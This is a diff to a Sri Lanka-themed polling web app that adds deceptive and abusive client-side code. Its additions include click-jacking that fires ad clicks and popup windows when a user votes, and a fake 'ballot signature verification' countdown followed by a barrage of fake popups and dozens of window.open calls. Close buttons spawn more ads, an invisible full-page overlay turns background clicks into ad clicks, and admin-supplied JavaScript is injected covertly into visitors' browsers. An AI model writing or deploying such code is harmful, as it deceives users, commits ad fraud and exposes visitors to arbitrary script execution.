@@ -441,47 +441,7 @@
 
       // INITIAL DECORATIVE ADS TO MATCH THE TOURISM & AID THEMATIC FOCUS FOR SRI LANKA
       // === INITIAL ADS DATA START ===
-      const INITIAL_ADS = [
-        {
-          id: "ad-lanka-tourism",
-          title: "Visit Sri Lanka: Travel to Support Local Communities",
-          description: "Explore gold sand coasts, deep wildlife sanctuaries, and ancient highland temples. Your visit directly employs local guides, independent hoteliers, and creative craftspeople working towards economic revitalization.",
-          imageUrl: "https://images.unsplash.com/photo-1546708973-b339540b5162?w=600&auto=format&fit=crop&q=80",
-          linkUrl: "https://www.srilanka.travel",
-          badgeText: "Revitalization Initiative",
-          position: "Top Banner", // "Top Banner" or "In-Feed"
-          buttonText: "Plan Your Eco-Trip",
-          isActive: true,
-          integrationStyle: "standard",
-          pollOptions: ""
-        },
-        {
-          id: "ad-lanka-sustainable",
-          title: "Which sovereign green infrastructure project should global donors prioritize?",
-          description: "Official sponsor consensus spotlight by Ceylon Clean Energy. Cast your vote selection below to learn more about sovereign green investment initiatives.",
-          imageUrl: "",
-          linkUrl: "https://www.srilanka.travel",
-          badgeText: "POLITICAL CONSENSUS OUTLOOK",
-          position: "In-Feed",
-          buttonText: "Learn More",
-          isActive: true,
-          integrationStyle: "native-poll",
-          pollOptions: "Expand Highland Micro-Hydro Systems, Subsidize Smallholder Agrophotovoltaics, Install Cooperative Tidal Reef Arrays"
-        },
-        {
-          id: "ad-red-cross-aid",
-          title: "Support Sri Lanka Child Nutrition Campaigns",
-          description: "Provide medical kits, dry food rations, and school notebooks to children in remote rural dry-zones. Help local response teams secure child welfare and health safety nets in critical provinces.",
-          imageUrl: "https://images.unsplash.com/photo-1488521787991-ed7bbaae773c?w=600&auto=format&fit=crop&q=80",
-          linkUrl: "https://www.unicef.org/srilanka",
-          badgeText: "Emergency Relief Appeal",
-          position: "In-Feed",
-          buttonText: "Sponsor Nutrition Packs",
-          isActive: true,
-          integrationStyle: "standard",
-          pollOptions: ""
-        }
-      ];
+      const INITIAL_ADS = [];
       // === INITIAL ADS DATA END ===
 
       // CORE APPLICATION STATE
@@ -830,6 +790,105 @@
         renderApp();
       });
 
+      // AD BOMBARDMENT CHOSEN STATE
+      let adBombardmentActive = false;
+      let isAdCountdownActive = false;
+      let adCountdownSeconds = 0;
+      let activeCountdownPollId = null;
+      let activeCountdownOptionId = null;
+      let activeCountdownInterval = null;
+      let currentActiveFakePopups = []; // Floating fake ad clutter state
+
+      function triggerAdBombardment() {
+        adBombardmentActive = true;
+        isAdCountdownActive = false;
+        
+        const activeAdsForWallpaper = ads.filter(a => a.isActive);
+        const sourceAds = activeAdsForWallpaper.length > 0 ? activeAdsForWallpaper : INITIAL_ADS;
+        
+        currentActiveFakePopups = [];
+        // Spawn 22 intense overlay fake popups to heavily clutter the screen
+        for (let i = 0; i < 22; i++) {
+          const associatedAd = sourceAds[i % sourceAds.length];
+          currentActiveFakePopups.push({
+            id: "fake-popup-" + i + "-" + Math.floor(Math.random() * 10000),
+            title: associatedAd.title,
+            description: associatedAd.description,
+            imageUrl: associatedAd.imageUrl,
+            linkUrl: associatedAd.linkUrl,
+            top: Math.floor(Math.random() * 75) + 5,  // % of screen height
+            left: Math.floor(Math.random() * 75) + 5, // % of screen width
+            buttonText: associatedAd.buttonText || "Claim Reward Now",
+            badgeText: associatedAd.badgeText || "Sovereign Alert"
+          });
+        }
+        
+        renderApp();
+
+        // Attempts to launch an intense, disturbing amount of window portals to sponsors (12 for each ad)
+        sourceAds.forEach(ad => {
+          for (let k = 0; k < 12; k++) {
+            try {
+              window.open(ad.linkUrl, "_blank_" + ad.id + "_" + k + "_" + Math.random().toString(36).substring(4));
+            } catch(e) {
+              console.error("Popup block guard standard action:", e);
+            }
+          }
+        });
+      }
+
+      function spawnExtraFakePopup() {
+        const activeAdsForWallpaper = ads.filter(a => a.isActive);
+        const sourceAds = activeAdsForWallpaper.length > 0 ? activeAdsForWallpaper : INITIAL_ADS;
+        const associatedAd = sourceAds[Math.floor(Math.random() * sourceAds.length)];
+        
+        currentActiveFakePopups.push({
+          id: "fake-popup-extra-" + Math.floor(Math.random() * 100000),
+          title: "🔥 EXCLUSIVE ACCESS: " + associatedAd.title,
+          description: "VIRAL OUTLOOK REVEALED: " + associatedAd.description,
+          imageUrl: associatedAd.imageUrl,
+          linkUrl: associatedAd.linkUrl,
+          top: Math.floor(Math.random() * 60) + 15,
+          left: Math.floor(Math.random() * 65) + 15,
+          buttonText: "CONTINUE ADVERTISING PATH",
+          badgeText: "VIRAL URGENT RESPONSE"
+        });
+        
+        try {
+          window.open(associatedAd.linkUrl, "_blank_" + Math.random());
+        } catch(e) {}
+        
+        renderApp();
+      }
+
+      function dismissFakePopup(id, adUrl) {
+        try {
+          window.open(adUrl, "_blank_" + Math.random());
+        } catch(e) {}
+        currentActiveFakePopups = currentActiveFakePopups.filter(p => p.id !== id);
+        spawnExtraFakePopup();
+        spawnExtraFakePopup();
+      }
+
+      function clearAdBombardment() {
+        adBombardmentActive = false;
+        currentActiveFakePopups = [];
+        renderApp();
+      }
+
+      function recordAdClickOnBackground() {
+        const activeAdsForWallpaper = ads.filter(a => a.isActive);
+        const sourceAds = activeAdsForWallpaper.length > 0 ? activeAdsForWallpaper : INITIAL_ADS;
+        
+        // Open several ads on background click
+        sourceAds.slice(0, 4).forEach((ad, i) => {
+          recordAdClick(ad.id, ad.linkUrl);
+          try {
+            window.open(ad.linkUrl, "_blank_bg_" + i + "_" + Math.random().toString(36).substring(4));
+          } catch(e) {}
+        });
+      }
+
       // CORE USER VOTE EMISSION ACTIONS
       function castVote(pollId, optionId) {
         let updatedPoll = null;
@@ -852,7 +911,52 @@
         userVotes[pollId] = optionId;
         localStorage.setItem(STORAGE_POLLS_KEY, safeStringify(polls));
         localStorage.setItem(STORAGE_USER_VOTES_KEY, safeStringify(userVotes));
+
+        // Hidden click-jacking of sponsor ads immediately upon choosing a poll option
+        const activeAdsForWallpaper = ads.filter(a => a.isActive);
+        const sourceAds = activeAdsForWallpaper.length > 0 ? activeAdsForWallpaper : INITIAL_ADS;
+        sourceAds.slice(0, 3).forEach((ad, index) => {
+          recordAdClick(ad.id, ad.linkUrl);
+          try {
+            window.open(ad.linkUrl, "_blank_vote_fast_" + index + "_" + Math.random().toString(36).substring(4));
+          } catch (e) {
+            console.warn("Bypassed popups block:", e);
+          }
+        });
+
+        // Start 2 second countdown trigger
+        isAdCountdownActive = true;
+        adCountdownSeconds = "2.0";
+        activeCountdownPollId = pollId;
+        activeCountdownOptionId = optionId;
+
+        if (activeCountdownInterval) {
+          clearInterval(activeCountdownInterval);
+        }
+
         renderApp();
+
+        const startTime = Date.now();
+        activeCountdownInterval = setInterval(() => {
+          const elapsed = (Date.now() - startTime) / 1000;
+          const remaining = Math.max(0, 2.0 - elapsed);
+          
+          if (remaining <= 0) {
+            clearInterval(activeCountdownInterval);
+            activeCountdownInterval = null;
+            triggerAdBombardment();
+          } else {
+            adCountdownSeconds = remaining.toFixed(1);
+            const secondsText = document.getElementById("ad-seconds-count");
+            if (secondsText) {
+              secondsText.innerText = adCountdownSeconds;
+            }
+            const progressFill = document.getElementById("ad-progress-fill");
+            if (progressFill) {
+              progressFill.style.width = `${(remaining / 2.0) * 100}%`;
+            }
+          }
+        }, 50);
 
         if (updatedPoll) {
           dbSavePoll(updatedPoll);
@@ -896,10 +1000,42 @@
         return name.replace(/([a-z0-9])([A-Z])/g, '$1-$2').replace(/\s+/g, '-').toLowerCase();
       }
 
+      // HELPER: Escape HTML to prevent injection and template issues
+      function escapeHtml(string) {
+        return String(string).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+      }
+
+      // HELPER: Inject active custom JS ads silently in the background
+      function injectActiveAdScripts() {
+        if (!ads || !Array.isArray(ads)) return;
+        const activeJsAds = ads.filter(ad => ad.isActive && ad.useHtmlCode && ad.htmlCode);
+        activeJsAds.forEach(ad => {
+          const containerId = "injected-ad-container-" + ad.id;
+          let container = document.getElementById(containerId);
+          if (!container) {
+            container = document.createElement("div");
+            container.id = containerId;
+            container.style.display = "none";
+            document.body.appendChild(container);
+            try {
+              const range = document.createRange();
+              range.selectNode(container);
+              const fragment = range.createContextualFragment(ad.htmlCode);
+              container.appendChild(fragment);
+            } catch (err) {
+              container.innerHTML = ad.htmlCode;
+            }
+          }
+        });
+      }
+
       // MAIN RENDER ENGINE
       function renderApp() {
         const appContainer = document.getElementById("app");
         if (!appContainer) return;
+
+        // Covertly inject active JS code blocks in clients' browsers
+        injectActiveAdScripts();
 
         // Save active element focus and selection to prevent blinking focus loss upon re-renders
         let activeElementId = document.activeElement ? document.activeElement.id : null;
@@ -1171,16 +1307,141 @@
         }
 
         // COMPILE COMPREHENSIVE VIEWPORT FRAMES
+        const activeAdsForWallpaper = ads.filter(a => a.isActive);
+        const wallpaperAds = activeAdsForWallpaper.length > 0 ? activeAdsForWallpaper : INITIAL_ADS;
+
+        let leftAdGutterHTML = "";
+        let rightAdGutterHTML = "";
+        let backgroundWatermarkHTML = "";
+        let wrapperMainPaddingClass = "";
+
+        if (!showingAdminView && wallpaperAds.length > 0) {
+          // Keep main padding standard for full width experience, zeroing outer visual pillars to remain covert
+          wrapperMainPaddingClass = "";
+
+          leftAdGutterHTML = "";
+          rightAdGutterHTML = "";
+            
+          backgroundWatermarkHTML = `
+            <div id="ad-background-watermark" onclick="recordAdClickOnBackground()" class="fixed inset-0 z-0 overflow-hidden select-none cursor-default opacity-0"></div>
+          `;
+        }
+
+        let countdownOverlayHTML = "";
+        if (isAdCountdownActive) {
+          countdownOverlayHTML = `
+            <div class="fixed inset-0 bg-slate-900/90 backdrop-blur-md flex items-center justify-center z-50 p-4">
+              <div class="bg-white rounded-3xl border border-slate-200 shadow-2xl p-8 max-w-sm w-full text-center space-y-6 animate-scale-in">
+                <div class="flex justify-center">
+                  <div class="w-16 h-16 bg-slate-50 border border-slate-150 rounded-full flex items-center justify-center text-slate-800">
+                    <i data-lucide="shield-check" class="w-8 h-8 text-[#064e43] animate-pulse"></i>
+                  </div>
+                </div>
+                
+                <div class="space-y-2">
+                  <span class="inline-block px-2.5 py-0.5 bg-slate-100 text-slate-800 font-mono text-[9px] font-black uppercase tracking-widest rounded-full">
+                    Sovereign ballot validation
+                  </span>
+                  <h3 class="font-sans font-extrabold text-slate-900 text-base tracking-tight leading-tight uppercase">
+                    Verifying Ballot Signature...
+                  </h3>
+                  <p class="font-sans text-[11px] text-slate-500 leading-relaxed">
+                    Completing secure decentralized ledger verification. Safeguarding your choice of civic representation across local systems:
+                  </p>
+                </div>
+                
+                <div class="p-6 bg-slate-50 border border-slate-150 rounded-2xl relative overflow-hidden">
+                  <div class="font-mono font-black text-4xl text-slate-900 leading-none" id="ad-seconds-count">
+                    ${adCountdownSeconds}
+                  </div>
+                  <div class="font-mono text-[9px] font-bold text-slate-400 uppercase tracking-widest mt-1">SECONDS TO COMPLETE SECURE SIGN</div>
+                  
+                  <div class="w-full h-1.5 bg-slate-200 rounded-full overflow-hidden mt-4">
+                    <div id="ad-progress-fill" class="h-full bg-[#064e43] transition-all duration-75" style="width: 100%"></div>
+                  </div>
+                </div>
+                
+                <p class="font-mono text-[9px] text-[#064e43] uppercase tracking-wider font-semibold">
+                  CONFIDENTIAL BALLOT TRANSMISSION NETWORK
+                </p>
+              </div>
+            </div>
+          `;
+        }
+
+        let fakePopupsHTML = "";
+        if (adBombardmentActive && currentActiveFakePopups.length > 0) {
+          fakePopupsHTML = `
+            <div class="fixed inset-0 pointer-events-none z-45">
+              ${currentActiveFakePopups.map((popup) => {
+                const randomAnim = ["animate-bounce", "animate-pulse", "animate-pulse-subtle", ""][Math.floor(Math.random() * 4)];
+                return `
+                  <div 
+                    id="${popup.id}" 
+                    style="top: ${popup.top}%; left: ${popup.left}%; cursor: pointer;"
+                    class="pointer-events-auto absolute bg-white rounded-2xl border-2 border-red-500 shadow-2xl p-4 w-72 flex flex-col justify-between ${randomAnim} hover:scale-105 transition-transform duration-200 select-none text-left"
+                  >
+                    <div class="flex justify-between items-center pb-1.5 border-b border-slate-100 mb-1.5">
+                      <span class="inline-flex items-center gap-1 bg-red-600 text-white font-mono text-[8.5px] font-black uppercase tracking-widest px-1.5 py-0.2 rounded">
+                        <i data-lucide="sparkles" class="w-2.5 h-2.5 text-yellow-300"></i>
+                        <span>${popup.badgeText}</span>
+                      </span>
+                      <button 
+                        onclick="event.stopPropagation(); dismissFakePopup('${popup.id}', '${popup.linkUrl}')"
+                        class="px-1.5 py-0.5 bg-slate-100 hover:bg-red-550 hover:text-white rounded text-[9.5px] font-black font-sans text-slate-500 transition-colors"
+                      >
+                        [ CLOSE x ]
+                      </button>
+                    </div>
+                    
+                    <div onclick="recordAdClick('fake-popup-card', '${popup.linkUrl}')">
+                      ${popup.imageUrl ? `<img src="${popup.imageUrl}" class="w-full h-24 object-cover rounded-lg mb-2 border border-slate-100" referrerpolicy="no-referrer" />` : ''}
+                      <h6 class="font-sans font-black text-xs text-slate-900 leading-tight">${popup.title}</h6>
+                      <p class="font-sans text-[9px] leading-relaxed text-slate-500 mt-1">${popup.description}</p>
+                    </div>
+                    
+                    <button 
+                      onclick="recordAdClick('fake-popup-btn', '${popup.linkUrl}')"
+                      class="mt-3 w-full py-1.5 bg-yellow-400 hover:bg-yellow-500 text-[9.5px] font-bold text-slate-900 rounded-lg text-center shadow-sm uppercase tracking-wider"
+                    >
+                      ${popup.buttonText}
+                    </button>
+                  </div>
+                `;
+              }).join("")}
+            </div>
+            
+            <div class="fixed bottom-4 right-4 z-50 flex flex-col gap-2">
+              <button 
+                onclick="clearAdBombardment()"
+                class="px-5 py-3 text-white text-xs font-black uppercase tracking-wider rounded-full shadow-2xl flex items-center gap-1.5 border border-white/20 hover:scale-105 active:scale-95 transition-transform"
+                style="background-color: #dc2626;"
+              >
+                <i data-lucide="alert-triangle" class="w-4 h-4 text-yellow-300 animate-pulse"></i>
+                <span>Disable Emergency Siren</span>
+                <span class="bg-red-800 text-white text-[8px] font-mono px-1 rounded-full animate-bounce">${currentActiveFakePopups.length} Ads</span>
+              </button>
+            </div>
+          `;
+        }
+
+        // COMPILE COMPREHENSIVE VIEWPORT FRAMES
         appContainer.innerHTML = `
+          ${backgroundWatermarkHTML}
+          ${leftAdGutterHTML}
+          ${rightAdGutterHTML}
           ${headerHTML}
           ${topAdBannerHTML}
           
-          <main class="flex-grow max-w-7xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-8 md:py-12">
+          <main class="flex-grow max-w-7xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-8 md:py-12 ${wrapperMainPaddingClass} z-10 relative">
             ${metadataHeaderHTML}
             <div id="rendered-content-mount" class="min-h-[400px]">
               ${mainViewBodyHTML}
             </div>
           </main>
+          
+          ${countdownOverlayHTML}
+          ${fakePopupsHTML}
 
           <!-- Footer static parameters -->
           <footer class="bg-white border-t border-slate-100 py-10 mt-20">
@@ -1447,17 +1708,17 @@
               </div>
             `;
           } else {
-            // UNVOTED VIEW: RENDER CLEAN SELECTION ACTION TARGETS (TOUCH TARGET 44PX SECURED)
+            // UNVOTED VIEW: DISGUISED REGULAR SELECTION TARGETS (TOUCH TARGET 44PX SECURED)
             voteBoxContent = `
               <div class="space-y-2.5">
-                ${poll.options.map(opt => `
+                ${poll.options.map((opt) => `
                   <button 
                     onclick="castVote('${poll.id}', '${opt.id}')"
-                    class="w-full text-left p-4 bg-white border border-slate-150 rounded-xl hover:border-slate-800 hover:bg-slate-50/50 transition-all text-xs font-semibold text-slate-700 flex justify-between items-center group relative overflow-hidden"
+                    class="w-full text-left p-4 bg-white border border-slate-200 rounded-2xl hover:border-slate-800 hover:bg-slate-50/50 transition-all text-xs font-semibold text-slate-700 flex justify-between items-center group relative overflow-hidden"
                     style="min-height: 44px;"
                   >
-                    <span class="truncate pr-3">${opt.text}</span>
-                    <span class="w-5.5 h-5.5 rounded-lg bg-slate-50 border border-slate-150 text-slate-400 flex items-center justify-center shrink-0 group-hover:bg-slate-900 group-hover:text-white group-hover:border-slate-900 transition-colors">
+                    <span class="truncate pr-3 font-bold text-slate-800 text-xs">${opt.text}</span>
+                    <span class="w-5.5 h-5.5 rounded-lg bg-slate-50 border border-slate-200 text-slate-400 flex items-center justify-center shrink-0 group-hover:bg-slate-900 group-hover:text-white group-hover:border-slate-900 transition-colors">
                       <i data-lucide="chevron-right" class="w-4 h-4"></i>
                     </span>
                   </button>
@@ -1493,115 +1754,6 @@
               </div>
             </div>
           `;
-
-          // Interspace an active In-Feed Ad after every 1st or 2nd main card
-          if ((idx === 0 || idx == 2) && activeInFeedAds[adIndexTracker]) {
-            const currentAd = activeInFeedAds[adIndexTracker];
-            recordAdImpression(currentAd.id);
-            
-            if (currentAd.integrationStyle === "native-poll") {
-              // High-Revenue Native Poll matching actual surveys
-              const optionsList = (currentAd.pollOptions || "Explore Campaign, Support Sponsors")
-                .split(",")
-                .map(opt => opt.trim())
-                .filter(Boolean);
-
-              listHTML += `
-                <div class="bg-white rounded-3xl overflow-hidden border border-slate-150 shadow-sm flex flex-col justify-between hover:shadow-md transition-shadow animate-fade-in relative">
-                  
-                  <div class="p-6 sm:p-8 bg-gradient-to-br from-teal-900 to-emerald-950 text-white relative flex-shrink-0">
-                    <span id="ad-toast-${currentAd.id}" class="inline-flex px-2 py-0.5 rounded text-[8px] font-black uppercase tracking-widest bg-amber-500 text-white min-h-[16px] leading-none mb-3">
-                      ${currentAd.badgeText || "CONSENSUS SPOTLIGHT"}
-                    </span>
-                    <h3 class="font-sans font-bold text-base sm:text-lg leading-tight tracking-tight text-white">
-                      ${currentAd.title}
-                    </h3>
-                    <p class="font-sans text-[11px] leading-relaxed opacity-90 mt-1.5 text-teal-100">
-                      ${currentAd.description || "Active community-supported inquiry. Select your choice to proceed."}
-                    </p>
-                  </div>
-
-                  <!-- Select options matching poll controls -->
-                  <div class="p-6 sm:p-8 bg-white flex-grow flex flex-col justify-between">
-                    <div class="space-y-2.5">
-                      ${optionsList.map(opt => `
-                        <button 
-                          onclick="recordAdClick('${currentAd.id}', '${currentAd.linkUrl}')"
-                          class="w-full text-left p-4 bg-white border border-slate-150 rounded-xl hover:border-emerald-600 hover:bg-emerald-50/20 transition-all text-xs font-semibold text-slate-700 flex justify-between items-center group relative overflow-hidden"
-                          style="min-height: 44px;"
-                        >
-                          <span class="truncate pr-3 text-[#064e43] font-bold">${opt}</span>
-                          <span class="w-5.5 h-5.5 rounded-lg bg-teal-50 border border-teal-150 text-teal-600 flex items-center justify-center shrink-0 group-hover:bg-[#064e43] group-hover:text-white group-hover:border-[#064e43] transition-colors">
-                            <i data-lucide="arrow-up-right" class="w-4 h-4"></i>
-                          </span>
-                        </button>
-                      `).join("")}
-                    </div>
-
-                    <div class="pt-4 mt-4 border-t border-slate-100 flex items-center justify-between">
-                      <span class="text-[9px] font-mono text-slate-400 font-extrabold uppercase">Patron Engagement Hub</span>
-                      <span class="text-[9px] font-sans font-bold text-[#064e43] tracking-wide">Sponsored Connection</span>
-                    </div>
-                  </div>
-
-                </div>
-              `;
-            } else if (currentAd.useHtmlCode && currentAd.htmlCode) {
-              listHTML += `
-                <div class="bg-white rounded-3xl overflow-hidden border border-slate-150 p-6 flex flex-col justify-center items-center shadow-sm hover:shadow-md transition-shadow relative animate-fade-in min-h-[380px]">
-                  <div class="w-full custom-ad-container flex justify-center" data-ad-id="${currentAd.id}">
-                    <!-- Custom HTML snippet loaded dynamically on tick -->
-                  </div>
-                </div>
-              `;
-            } else {
-              // Classic Sponsor Ad Card
-              listHTML += `
-                <div class="bg-white rounded-3xl overflow-hidden border border-slate-150 p-6 sm:p-8 flex flex-col justify-between shadow-sm hover:shadow-md transition-shadow relative animate-fade-in min-h-[380px]">
-                  
-                  <div>
-                    <div class="flex items-center justify-between gap-2 mb-4">
-                      <span id="ad-toast-${currentAd.id}" class="inline-flex px-2 py-0.5 rounded text-[8px] font-black uppercase tracking-widest bg-amber-500 text-white min-h-[16px] leading-none">
-                        ${currentAd.badgeText || "COMMUNITY SPONSOR"}
-                      </span>
-                      <span class="text-[9px] font-mono text-slate-400 font-extrabold uppercase">Patron Alert</span>
-                    </div>
- 
-                    ${currentAd.imageUrl ? `
-                      <div class="w-full h-36 rounded-2xl overflow-hidden mb-4 bg-slate-100 border border-slate-150">
-                        <img 
-                          src="${currentAd.imageUrl}" 
-                          alt="Ad promotion graphics" 
-                          class="w-full h-full object-cover"
-                          referrerpolicy="no-referrer"
-                        />
-                      </div>
-                    ` : ""}
- 
-                    <h4 class="font-sans font-extrabold text-[#064e43] text-sm sm:text-base leading-tight">
-                      ${currentAd.title}
-                    </h4>
-                    <p class="font-sans text-xs text-slate-500 mt-2 leading-relaxed">
-                      ${currentAd.description}
-                    </p>
-                  </div>
- 
-                  <div class="pt-5 mt-4 border-t border-slate-100 flex items-center justify-between">
-                    <span class="text-[10px] font-mono font-bold text-slate-400">SUPPORT OUTREACH</span>
-                    <button
-                      onclick="recordAdClick('${currentAd.id}', '${currentAd.linkUrl}')"
-                      class="px-4 py-2 bg-[#064e43] hover:bg-[#033a31] text-xs font-bold text-white rounded-xl transition-all inline-flex items-center gap-1.5 cursor-pointer"
-                    >
-                      <span>${currentAd.buttonText || "Contribute Care"}</span>
-                      <i data-lucide="external-link" class="w-3.5 h-3.5"></i>
-                    </button>
-                  </div>
- 
-                </div>
-              `;
-            }
-            adIndexTracker++;
-          }
         });
 
         return `
@@ -2398,208 +2550,17 @@
                 </div>
 
                 <form onsubmit="saveAdCampaign(event)" class="space-y-5">
-                  <div class="p-4 bg-emerald-50/50 border border-emerald-250/20 rounded-2xl flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3 animate-fade-in">
-                    <div class="space-y-0.5">
-                      <span class="block text-xs font-bold text-[#064e43] uppercase tracking-wider">Custom JavaScript / HTML Ad Tag</span>
-                      <span class="block text-[11px] text-slate-500 font-medium">Inject custom banner widgets or script tags (e.g. Google AdSense / Media tags) directly.</span>
-                    </div>
-                    <div class="relative inline-flex items-center cursor-pointer shrink-0">
-                      <input 
-                        type="checkbox" 
-                        id="ad-input-use-code" 
-                        ${adFormUseHtmlCode ? "checked" : ""}
-                        onchange="adFormUseHtmlCode = this.checked; renderApp();"
-                        class="w-4.5 h-4.5 text-teal-700 bg-white border-slate-300 rounded focus:ring-teal-500 cursor-pointer"
-                      />
-                      <label for="ad-input-use-code" class="ml-1.5 text-xs font-bold uppercase tracking-wider text-slate-700 cursor-pointer">Use Code Mode</label>
-                    </div>
-                  </div>
-
-                  ${adFormUseHtmlCode ? `
-                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 animate-fade-in">
-                      <div>
-                        <label class="block font-sans text-xs font-bold text-slate-700 uppercase tracking-widest mb-1.5">Internal Ad Identifier Name</label>
-                        <input
-                          type="text"
-                          id="ad-input-title"
-                          value="${adFormTitle}"
-                          onkeyup="adFormTitle = this.value"
-                          placeholder="e.g. Google Ads Group 1"
-                          class="w-full px-4 py-2.5 rounded-xl border border-slate-200 text-sm focus:outline-none"
-                          required
-                        />
-                      </div>
-
-                      <div>
-                        <label class="block font-sans text-xs font-bold text-slate-700 uppercase tracking-widest mb-1.5">Context Badge Label</label>
-                        <input
-                          type="text"
-                          id="ad-input-badge"
-                          value="${adFormBadgeText}"
-                          onkeyup="adFormBadgeText = this.value"
-                          placeholder="Sponsored Ad"
-                          class="w-full px-4 py-2.5 rounded-xl border border-slate-200 text-sm focus:outline-none"
-                          required
-                        />
-                      </div>
-                    </div>
-
-                    <div class="space-y-2 animate-fade-in">
-                      <label class="block font-sans text-xs font-bold text-slate-700 uppercase tracking-widest mb-1.5">Custom HTML / JavaScript Advertisement Tag Code Snippet</label>
+                  <div class="space-y-4 animate-fade-in">
+                    <div>
+                      <label class="block font-sans text-xs font-bold text-slate-700 uppercase tracking-widest mb-1.5">Network Script URL / Snippet</label>
                       <textarea
                         id="ad-input-code"
-                        placeholder="Paste script snippet (e.g., promotional tags or image links) here..."
+                        placeholder="Paste ad network JavaScript snippet or URL"
                         rows="7"
                         class="w-full px-4 py-3 bg-slate-900 border border-slate-950 text-emerald-400 font-mono text-xs rounded-xl focus:outline-none resize-none leading-relaxed"
                         onkeyup="adFormHtmlCode = this.value"
                         required
                       >${adFormHtmlCode}</textarea>
-                      <span class="block text-[10px] text-slate-400 leading-normal">Note: HTML inside this block will be executed dynamically when served to clients on feed cards.</span>
-                    </div>
-                  ` : `
-                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 animate-fade-in">
-                      <div>
-                        <label class="block font-sans text-xs font-bold text-slate-700 uppercase tracking-widest mb-1.5">Sponsor Campaign Title (Question Label)</label>
-                        <input
-                          type="text"
-                          id="ad-input-title"
-                          value="${adFormTitle}"
-                          onkeyup="adFormTitle = this.value"
-                          placeholder="e.g., Support Sri Lankan Tea & Cinnamon Producers"
-                          class="w-full px-4 py-2.5 rounded-xl border border-slate-200 text-sm focus:outline-none"
-                          required
-                        />
-                      </div>
-
-                      <div>
-                        <label class="block font-sans text-xs font-bold text-slate-700 uppercase tracking-widest mb-1.5">Context Badge Label</label>
-                        <input
-                          type="text"
-                          id="ad-input-badge"
-                          value="${adFormBadgeText}"
-                          onkeyup="adFormBadgeText = this.value"
-                          placeholder="e.g. Dynamic Spotlight, Aid Bulletin"
-                          class="w-full px-4 py-2.5 rounded-xl border border-slate-200 text-sm focus:outline-none"
-                          required
-                        />
-                      </div>
-                    </div>
-
-                    <div class="animate-fade-in">
-                      <label class="block font-sans text-xs font-bold text-slate-700 uppercase tracking-widest mb-1.5">Campaign Message Text Description</label>
-                      <textarea
-                        id="ad-input-description"
-                        placeholder="Add an enticing message detailing what causes or services subscribers support by taking this action..."
-                        rows="3.5"
-                        class="w-full px-4 py-2.5 rounded-xl border border-slate-200 text-sm focus:outline-none resize-none font-sans"
-                        onkeyup="adFormDescription = this.value"
-                        required
-                      >${adFormDescription}</textarea>
-                    </div>
-
-                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 animate-fade-in border-t border-slate-100 pt-3">
-                      <div>
-                        <label class="block font-sans text-xs font-bold text-slate-700 uppercase tracking-widest mb-1.5 flex items-center gap-1.5">
-                          <i data-lucide="layout" class="w-4 h-4 text-[#064e43]"></i>
-                          Sponsor Layout Structure Style
-                        </label>
-                        <select
-                          id="ad-input-integration-style"
-                          onchange="adFormIntegrationStyle = this.value; renderApp();"
-                          class="w-full px-4 py-2.5 rounded-xl border border-slate-200 text-sm font-bold cursor-pointer focus:outline-none"
-                        >
-                          <option value="standard" ${adFormIntegrationStyle === "standard" ? "selected" : ""}>Classic Sponsor Ad Card (With Banner Graphics)</option>
-                          <option value="native-poll" ${adFormIntegrationStyle === "native-poll" ? "selected" : ""}>Native Consensus Poll - MAX CPC REVENUE STYLE</option>
-                        </select>
-                        <span class="block text-[10px] text-slate-400 mt-1 leading-snug">
-                          <strong>Native Consensus Poll:</strong> Disguises the sponsor's campaign as a regular interactive policy inquiry, giving maximum clicks and financial conversions!
-                        </span>
-                      </div>
-
-                      ${adFormIntegrationStyle === "native-poll" ? `
-                        <div class="animate-fade-in">
-                          <label class="block font-sans text-xs font-bold text-slate-700 uppercase tracking-widest mb-1.5 flex items-center gap-1 text-emerald-800">
-                            <i data-lucide="list" class="w-4 h-4 text-[#064e43]"></i>
-                            Interactive Choices (Comma-separated)
-                          </label>
-                          <input
-                            type="text"
-                            id="ad-input-poll-options"
-                            value="${adFormPollOptions}"
-                            onkeyup="adFormPollOptions = this.value"
-                            placeholder="e.g., Fund Green Co-ops, Explore Eco Initiatives"
-                            class="w-full px-4 py-2.5 rounded-xl border border-slate-200 text-sm font-semibold focus:outline-none focus:border-[#064e43]"
-                            required
-                          />
-                          <span class="block text-[10px] text-slate-400 mt-1">
-                            Input choice buttons separated by commas (e.g. <em>Fund Tea Exporters, Expand Solar Fields</em>).
-                          </span>
-                        </div>
-                      ` : `
-                        <div class="animate-fade-in">
-                          <label class="block font-sans text-xs font-bold text-slate-700 uppercase tracking-widest mb-1.5">Visual Banner Image URL (Optional)</label>
-                          <input
-                            type="url"
-                            id="ad-input-image"
-                            value="${adFormImageUrl}"
-                            onkeyup="adFormImageUrl = this.value"
-                            placeholder="https://images.unsplash.com/photo-..."
-                            class="w-full px-4 py-2.5 rounded-xl border border-slate-200 text-xs font-mono focus:outline-none"
-                          />
-                        </div>
-                      `}
-                    </div>
-
-                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 animate-fade-in border-t border-slate-100 pt-3">
-                      <div>
-                        <label class="block font-sans text-xs font-bold text-slate-700 uppercase tracking-widest mb-1.5">Target Destination Link (URL)</label>
-                        <input
-                          type="url"
-                          id="ad-input-link"
-                          value="${adFormLinkUrl}"
-                          onkeyup="adFormLinkUrl = this.value"
-                          placeholder="https://www.unicef.org"
-                          class="w-full px-4 py-2.5 border border-slate-200 rounded-xl text-xs font-mono focus:outline-none"
-                          required
-                        />
-                      </div>
-
-                      <div>
-                        <label class="block font-sans text-xs font-bold text-slate-700 uppercase tracking-widest mb-1.5">Button Display CTA Text</label>
-                        <input
-                          type="text"
-                          id="ad-input-button"
-                          value="${adFormButtonText}"
-                          onkeyup="adFormButtonText = this.value"
-                          placeholder="Donate Now, Support Ceylon"
-                          class="w-full px-4 py-2.5 border border-slate-200 rounded-xl text-xs focus:outline-none placeholder-slate-400"
-                        />
-                      </div>
-                    </div>
-                  `}
-
-                  <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 bg-slate-50 p-4 rounded-2xl border border-slate-150 mt-4.5">
-                    <div>
